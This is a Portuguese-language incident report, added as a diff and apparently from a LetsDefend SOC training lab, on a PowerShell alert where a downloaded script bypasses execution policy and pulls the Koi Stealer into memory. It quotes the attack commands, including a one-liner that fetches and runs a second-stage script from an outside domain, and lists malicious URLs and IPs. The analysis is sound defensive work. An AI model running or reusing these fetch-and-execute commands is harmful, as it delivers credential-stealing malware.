@@ -1,0 +1,38 @@
+🛡️ Relatório de Investigação de Incidente: SOC153
+1. Resumo do Alerta
+ID do Evento: 238
+
+Nome da Regra: SOC153 - Suspicious Powershell Script Executed
+
+Data do Alerta: 14 de Março de 2024, 17:23
+
+Host Afetado: 172.16.17.206
+
+Técnica MITRE: T1566, T1059.001, T1059.003, T1562.001, T1620, T1555.003, T1071.001.
+
+2. Análise e Descobertas
+Análise do Artefato: As 17:22 recebemos um alerta do usuário Tony após acesssar o site https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1.
+Ao acessar o site o usuário Tony, faz o download do payload_1.ps1 (T1566)
+
+Estado do Endpoint:
+As 17:23 o processo powershell (T1059.001) é criado e executa o payload_1.ps1 com o seguinte script -Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\LetsDefend\Downloads\payload_1.ps1\payload_1.ps1
+Utilizando o cmd.exe para invocar o powershell e tentar ocultar a execução (T1059.003);
+Também utiliza a flag Bypass para burlar a politica de execução (T1562.001).
+
+O Powershell faz uma consulta DNS (Sysmond ID 22) para o kionagranada.com obtendo o IP 161.22.46.148, 
+para baixar o segundo estágio executando o comando C:\Windows\system32\cmd.exe" /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')"
+Baixando o sd2.ps1 / Koi - Stealer diretamente da memória, sem salvar no disco (T1620),
+Sendo o Koi-Stealer um malware focado em roubar credenciais, cookikes de navegador, dados de carteiras de criptomoedas, etc (T1555.003).
+Realizando também o a comunicação C2 via https com o domínio konagranada.com (T1071.001).
+
+3. Contenção e Mitigação
+O ideal seria isolar o host que já foi contanimado,
+Executando o bloqueio dos IPs relacionados ao malware, como 3.5.130.147, https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1, https://kionagranada.com/upload/sd2.ps1
+Resetando as credenciais associadas ao usuário do host,
+Escalando para a equipe de resposta a incidentes para uma analise forense e varredura completa, procurando identificar
+que acessos o koi-stealer pode ter visualizado e se houve tentativas de login suspeitas em contas criticas da empresa.
+
+4. Veredito Final
+Classificação: Verdadeiro Positivo (TP)
+
+Status Final: Resolvido / Escalonado ao IR.
